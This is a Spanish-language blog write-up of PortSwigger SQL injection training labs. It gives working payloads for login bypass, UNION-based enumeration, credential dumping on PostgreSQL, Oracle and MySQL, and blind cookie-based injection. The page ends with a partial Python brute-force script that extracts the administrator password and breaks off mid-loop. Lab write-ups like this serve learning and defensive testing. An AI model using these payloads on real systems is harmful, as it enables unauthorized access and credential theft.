<!DOCTYPE html>
<html lang="es" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='LAB 1: SQL injection vulnerability in WHERE clause allowing retrival of hidden data El laboratorio tiene una vulnerabilidad de SQLi en el filtro de categorias de los productos.
La pagina tramita por detras una peticion SQL que es la siguiente:
SELECT * FROM products WHERE category = &amp;lsquo;Gifts&amp;rsquo; AND released =1;
SELECT * FROM products WHERE category = &amp;lsquo;%s&amp;rsquo; AND released =1;
| %s es el campo que tu puedes alterar |'>
<title>PortSwigger SQLi Labs</title>

<link rel='canonical' href='/p/portswigger-sqli-labs/'>

<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='PortSwigger SQLi Labs'>
<meta property='og:description' content='LAB 1: SQL injection vulnerability in WHERE clause allowing retrival of hidden data El laboratorio tiene una vulnerabilidad de SQLi en el filtro de categorias de los productos.
La pagina tramita por detras una peticion SQL que es la siguiente:
SELECT * FROM products WHERE category = &amp;lsquo;Gifts&amp;rsquo; AND released =1;
SELECT * FROM products WHERE category = &amp;lsquo;%s&amp;rsquo; AND released =1;
| %s es el campo que tu puedes alterar |'>
<meta property='og:url' content='/p/portswigger-sqli-labs/'>
<meta property='og:site_name' content='Liv3P0ol'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2023-08-23T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2023-08-23T00:00:00&#43;00:00'/>
<meta name="twitter:title" content="PortSwigger SQLi Labs">
<meta name="twitter:description" content="LAB 1: SQL injection vulnerability in WHERE clause allowing retrival of hidden data El laboratorio tiene una vulnerabilidad de SQLi en el filtro de categorias de los productos.
La pagina tramita por detras una peticion SQL que es la siguiente:
SELECT * FROM products WHERE category = &amp;lsquo;Gifts&amp;rsquo; AND released =1;
SELECT * FROM products WHERE category = &amp;lsquo;%s&amp;rsquo; AND released =1;
| %s es el campo que tu puedes alterar |">
    <link rel="shortcut icon" href="/favicon.png" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/logo1_hu4cd92a203c8104ea58ca026f0632b0b6_33996_300x0_resize_q75_box.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Liv3P0ol</a></h1>
            <h2 class="site-description">Cybersecurity Analyst</h2>
        </div>
    </header><ol class="social-menu">
            
                <li>
                    <a 
                        href='https://github.com/liv3p0ol'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://linkedin.com/in/%c3%a1lvaro-gil-banda-323663196'
                        target="_blank"
                        title="LinkedIn"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 48 48" width="48px" height="48px"><path fill="#0288D1" d="M42,37c0,2.762-2.238,5-5,5H11c-2.761,0-5-2.238-5-5V11c0-2.762,2.239-5,5-5h26c2.762,0,5,2.238,5,5V37z"/><path fill="#FFF" d="M12 19H17V36H12zM14.485 17h-.028C12.965 17 12 15.888 12 14.499 12 13.08 12.995 12 14.514 12c1.521 0 2.458 1.08 2.486 2.499C17 15.887 16.035 17 14.485 17zM36 36h-5v-9.099c0-2.198-1.225-3.698-3.192-3.698-1.501 0-2.313 1.012-2.707 1.99C24.957 25.543 25 26.511 25 27v9h-5V19h5v2.616C25.721 20.5 26.85 19 29.738 19c3.578 0 6.261 2.25 6.261 7.274L36 36 36 36z"/></svg>
                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/whoami/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>Whoami</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        

        <div class="menu-bottom-section">
            
            
                <li id="dark-mode-toggle">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <span>Modo oscuro</span>
                </li>
            
        </div>
    </ol>
</aside>

    

            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/portswigger/" style="background-color: #FF5733; color: #fff;">
                PortSwigger
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/portswigger-sqli-labs/">PortSwigger SQLi Labs</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Aug 23, 2023</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    18 minutos a leer
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <div class="table-wrapper"><table>
<thead>
<tr>
<th style="text-align:center">LAB 1: SQL injection vulnerability in WHERE clause allowing retrival of hidden data</th>
</tr>
</thead>
</table></div>
<p>El laboratorio tiene una vulnerabilidad de SQLi en el filtro de categorias de los productos.</p>
<p>La pagina tramita por detras una peticion SQL que es la siguiente:</p>
<p>SELECT * FROM products WHERE category = &lsquo;Gifts&rsquo; AND released =1;</p>
<p>SELECT * FROM products WHERE category = &lsquo;%s&rsquo; AND released =1;</p>
<blockquote>
<p>| %s es el campo que tu puedes alterar |</p>
</blockquote>
<p>Por lo que muestra todos los datos de la tabla productos donde en la columna categoría valga Gifts y ademas tambien muetra aquellos que hayan sido publicados.</p>
<p>Explotación:
http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; or 1=1&ndash; -</p>
<p>La consulta que se tramitaria por detras seria la siguiente:</p>
<p>SELECT * FROM productos WHERE category = &lsquo;Pets&rsquo; or 1=1&ndash; -&rsquo; AND released=1;</p>
<p>Por lo que como la validación de 1=1 es correcta va a coger todas las categorias existentes como validas y las va a mostar todas junto con los articulos no publicados.</p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th style="text-align:center">LAB 2: SQL injection vulnerability allowing login bypass</th>
</tr>
</thead>
</table></div>
<p>El laboratorio tiene una vulnerabilidad de SQLi en el login de la pagina.</p>
<p>La query que puede esatr tramitando la pagina por detras podria ser algo así:</p>
<p>SELECT nombre,apellido FROM users WHERE username = &lsquo;administrator&rsquo; AND password = &lsquo;pass123&rsquo;;</p>
<p>SELECT nombre,apellido FROM users WHERE username = &lsquo;%s&rsquo; AND password = &lsquo;%s&rsquo;;</p>
<blockquote>
<p>| %s es el campo que tu puedes alterar |</p>
</blockquote>
<p>Explotación en el Login:</p>
<p>Username:
administrator&rsquo;&ndash; -</p>
<p>Password:
xxx</p>
<p>La consulta que se tramitaria por detras seria la siguiente:</p>
<p>SELECT nombre,apellido FROM users WHERE username = &lsquo;administrator&rsquo;&ndash; -&rsquo; AND password = &lsquo;xxx&rsquo;;</p>
<p>Esto sucede debido a que en esta consulta estamos comentando la parte de la contraseña por lo que no la tiene en cuenta a la hora de validar la consulta, y como el username de administrator existe la consulta es válida por lo que el login como administrador se puede llevar a cabo.</p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th style="text-align:center">LAB 3: SQL injection UNION attack, determining the number of columns returned by the query</th>
</tr>
</thead>
</table></div>
<p>El laboratorio tiene una vulnerabilidad de SQLi en el filtro de categorias.</p>
<p>En este caso primero vamos a averiguar cuantas columnas existen para la tabla en la que nos encontramos, para ello vamos a usar un <code>order by</code>  y tartar de encontrar las columnas a base de prueba y error en la pagina de la siguiente manera. El <code>order by</code> depende de los campos que se engloben en el SELECT.</p>
<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; order by 100&ndash; -</p>
<p>Esto provocara un error en la pagina, indicandonos que no es correcto.</p>
<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; order by 3&ndash; -</p>
<p>Al comprobar que son 3 gracias a que la pagina lo interpreta como bueno y muestra contenido sin error la sieguiente parte es usar UNION SELECT para combinar datos.</p>
<p>En este caso usamos NULL ya que la web no nos permite ponerlo con numeros que se cambiarian por los NULLs de esta forma: union select 1,2,3&ndash; -</p>
<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,NULL,NULL&ndash; -</p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th style="text-align:center">LAB 4: SQL injection UNION attack, finding a columng containing text</th>
</tr>
</thead>
</table></div>
<p>En este lab simplemente tenemos que hacer lo mismo pero esta vez queremos mostrar una cadena personalizada en la web gracias a los campos NULLs que tenemos. No todos los campos son inyectables, a veces hay que fuzzear y buscar de cual de ellos nos podemos aprovechar para sacar información de ellos.</p>
<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,&rsquo;texto&rsquo;,NULL&ndash; -</p>
<p>Esto hará que en la respuesta del servidor veamos en la web la palabra texto que hemos definido arriba.</p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th style="text-align:center">LAB 5: SQL injection UNION attack, retriving data from other tables</th>
</tr>
</thead>
</table></div>
<p>Este laboratorio trata de poder volcar información de otras tablas para poder conseguir datos del usuario administrador poder conectarnos como él.</p>
<p>Primero de todo vemos la cantidad de columnas que se tratan de golpe con el UNION SELECT saltándonos el paso del <code>order by</code>.
http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select NULL,NULL&ndash; -</p>
<p>Y comprobamos cual de estos dos campos es inyectable, ambos lo son, pero para practicar lo vamos a hacer solo con uno.
http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select &rsquo;test&rsquo;,NULL&ndash; -</p>
<p>Ahora vamos a comprobar las bases de datos existentes de la siguiente manera:
http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select schema_name,NULL from information_schema.schemata&ndash; -</p>
<p>Una vez sabiendos las bases de datos procedemos a enumerar las tablas de la base de datos que seleccionemos. <code>table_schema</code> es para indicar el nombre de la base de datos
http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select table_name,NULL from information_schema.tables where table_schema=&lsquo;public&rsquo;&ndash; -</p>
<p>Ahora porcedemos a sacar las columnas de la base de datos public y de la tabla users:
<code>table_name</code> es para indicar el nombre de la tabla.
http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select column_name,NULL from information_schema.colums where table_schema=&lsquo;public&rsquo; and table_name=&lsquo;users&rsquo;&ndash; -</p>
<p>Ya que tenemos todo lo necesario, podemos obtener los datos que estabamos buscando.
<code>group_concat()</code>  es para poder mostar ambos datos en una misma fila y poder verlos mejor representados. Tambien se puede con <code>concat()</code>
http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select group_concat(username,&rsquo;:&rsquo;,password),NULL from users&ndash; -</p>
<p>Si la base de datos que está actualmente en uso no es la que contiene los datos que deseamos obtener es necesario que la indiquemos de la siguiente manera: poniendo la base de datos delante de la tabla y después un punto: <code>public.users</code>
http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select group_concat(username,&rsquo;:&rsquo;,password),NULL from public.users&ndash; -</p>
<p>Si <code>group_concat</code> no funciona se pueden concatenar los datos de otra manera:
http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select username||&rsquo;:&rsquo;||password,NULL from public.users&ndash; -</p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th style="text-align:center">LAB 6: SQL injection UNION attack, retrieving multiple values in a single column</th>
</tr>
</thead>
</table></div>
<p>En este caso queremos ver toda la información en una única columna, asique es prácticamente lo mismo que el laboratorio anterior.</p>
<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select username||&rsquo;:&rsquo;||password,NULL from users&ndash; -</p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th style="text-align:center">LAB 7: SQL injection attack, querying the database type and version on Oracle</th>
</tr>
</thead>
</table></div>
<p>En este laboratorio se nos pide que saquemos solamente la informacion sobre la versión de Oracle</p>
<p>Es necesario poner <code>from dual</code> ya que es una tabla especial que aparece en todas las bases de datos de oracle. Esto nos vale para comprobar si estamos trabajando con Oracle.
http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Accessories&rsquo; union select NULL,NULL from dual&ndash; -</p>
<p>Ahora que ya sabemos que estamos trabajando con Oracle porcedemos a sacar la version en la que se encuentra, para ellos es necesario poner <code>SELECT banner FROM v\$version</code> o <code>SELECT version FROM v$instance</code>
http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Accessories&rsquo; union select NULL,banner from v$version&ndash; -</p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th style="text-align:center">LAB 8: SQL injection attack, querying the database type and version on MySQL and Microsoft</th>
</tr>
</thead>
</table></div>
<p>En este caso es lo mismo que en el anterior. Sacar la version de una base de datos Mysql y Microsoft ya que en ambas se obtiene de la misma manera.</p>
<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select NULL,@@version&ndash; -</p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th style="text-align:center">LAB 9: SQL injection attack, listing the database contents on non-Oracle databases</th>
</tr>
</thead>
</table></div>
<p>En este laboratorio se nos pide básicamente los mismo que en uno de los anteriores, simplemente obtener la password del usuario administrator y conectarnos con su cuenta, para ello es necesario primero investigar y sacar la base de datos, tabla y columnas necesarias para obtener dicha password.</p>
<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,NULL&ndash; -</p>
<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select schema_name,NULL from information_schema.schemata&ndash; -</p>
<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select table_name,NULL from information_schema.tables where table_schema=&lsquo;public&rsquo;&ndash; -</p>
<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select column_name,NULL from information_schema.columns where table_schema=&lsquo;public&rsquo; and table_name=&lsquo;nombre_tabla&rsquo;&ndash; -</p>
<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select username_xxx||&rsquo;:&rsquo;||password_xxx,NULL from users_xxx&ndash; -</p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th style="text-align:center">LAB 10: SQL injection attack, listing the database contents on Oracle databases</th>
</tr>
</thead>
</table></div>
<p>Este laboratorio consiste en los mismo que el anterior pero en este caso con una base de datos de Oracle, por lo que los pasos serán los mismos pero con una estructura un poco diferente.</p>
<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,NULL from dual&ndash; -</p>
<p>De esta forma vamos a mostrar todas las tablas de todas las bases de datos
http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,table_name from all_tables&ndash; -</p>
<p>Con <code>owners</code> vamos a mostrar propietarios
http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,owners from all_tables&ndash; -
De esta forma filtramos por las tablas del propietario que indiquemos
http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,table_name from all_tables where owner=&lsquo;nombre_del_propietario&rsquo;&ndash; -</p>
<p>Prosigamos con la obtención de las columnas de la siguiente manera: con <code>all_tab_columns</code> hacemos referencia a las columnas
http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,column_name from all_tab_columns where table_name=&lsquo;users_xxx&rsquo;&ndash; -</p>
<p>Y por últimos sacamos los datos username y password de la tabla users
http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,username_xxx||&rsquo;:&rsquo;||password_xxx from users_xxx&ndash; -</p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th style="text-align:center">LAB 11: Blind SQL injection with conditional responses</th>
</tr>
</thead>
</table></div>
<p>En este laboratorio el campo inyectable no es el de la categoría, es en la cookie, específicamente en TrackingId. Hay un campo que se muestra en la página como &ldquo;Welcome back!&rdquo;, pues este desaparece dependiendo de la inyección que hagamos, provocando que sepamos cual funciona y cual no dependiendo de si el mensaje de &ldquo;Welcome back!&rdquo; desaparece o no.</p>
<p>Para este lab vamos a necesitar tirar de burpsuite para hacerlo de manera mas cómodo al principio y después poder hacer un script en python que lo automatice.</p>
<p>Para entenderlo mejor vamos a hacer el ejemplo de la query que puede estar corriendo por detrás.
SELECT * FROM products WHERE TrackingId = &lsquo;xxxxxxxxx&rsquo;;</p>
<p>Vamos a ir escalando gradualmente hasta tener la query que nos permita sacar la password el usuario administrador la cual usaremos en el script.</p>
<p>Para comenzar lo que haremos será la siguiente(Todo esto en el campo de l coockie TrakingId):
<code>TrackingId=xxxxxxxxxxx' and (select 'a' from users where username='administrator')='a-- -</code></p>
<p>Aquí estamos filtrando por la letra &lsquo;a&rsquo; de administrator, como esta existe toda la query se va a convertir en una &lsquo;a&rsquo; por lo que va a quedar &lsquo;a&rsquo;=&lsquo;a y como esto es correcto vamos a ver el campo &lsquo;Welcome back!&rsquo; en la pagina lo que nos hará saber de que todo ha funcionado bien.</p>
<p><code>TrackingId=xxxxxxxxxxx' and (select substring(username,1,1) from users where username='administrator')='a-- -</code></p>
<p>Con esa query estamos haciendo prácticamente lo mismo, con substring lo que estamos haciendo es coger el primer carácter del campo username que en este caso estamos atentando directamente contra el &lsquo;administrator&rsquo;, y como este carácter es una &lsquo;a&rsquo; vamos a acabar teniendo el mimos resultado que en la query anterior: &lsquo;a&rsquo;=&lsquo;a.
En esta query lo que podemos es ir iterando sobre el primer numero de la funcion substring y cambiar la letra de después del = para así ir practicando y viendo que es lo que sucede.</p>
<p>Pero nosotros lo que necesitamos es la contraseña ya que el usuario ya lo sabemos. Por lo que primero vamos a intentar averiguar cual es la longitud de la contraseña para así ir directos en la creación del script contra la longitud de caracteres que tiene la contraseña.</p>
<p><code>TrackingId=xxxxxxxxxxx' and (select 'a' from users where username='administrator' and length(password)&gt;=20)='a-- -</code></p>
<p>Con length lo que vamos a hacer es poder saber la longitud del campo que introduzcamos dentro, a si que de esta manera si las dos condiciones se cumplen, la primera es como la del ejemplo que usamos antes y la segunda es comparando la longitud del campo password con un numero que nosotros pongamos iterando sobre él, hasta llegar a un numero donde no veamos el campo &lsquo;Welcome back!&rsquo; y así saber el limite de caracteres que tiene la contraseña.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">signal</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">pdb</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n\n</span><span class="s2">[!] Saliendo...</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Ctrl+C</span>
</span></span><span class="line"><span class="cl"><span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">main_url</span> <span class="o">=</span> <span class="s2">&#34;url de la web&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">characters</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">makeRequest</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="n">password</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Fuerza bruta&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s2">&#34;Iniciando ataque de fuerza bruta&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="n">p2</span> <span class="o">=</span> <span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Password&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">position</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">21</span><span class="p">):</span> <span class="c1"># CANTIDA DE CARACTERES QUE TIENE LA PASSWORD</span>
</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">characters</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			<span class="n">cookies</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="s1">&#39;TrackingId&#39;</span> <span class="p">:</span> <span class="s2">&#34;xxxxxxxxxxx&#39; and (select substring(password,</span><span class="si">%d</span><span class="s2">,1) from users where username=&#39;administrator&#39;)=&#39;</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">position</span><span class="p">,</span> <span class="n">character</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">				<span class="s1">&#39;session&#39;</span> <span class="p">:</span> <span class="s1">&#39;xxxxxxxxxxxxx&#39;</span>	 
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl">			<span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="n">cookies</span><span class="p">[</span><span class="s1">&#39;TrackingID&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">			
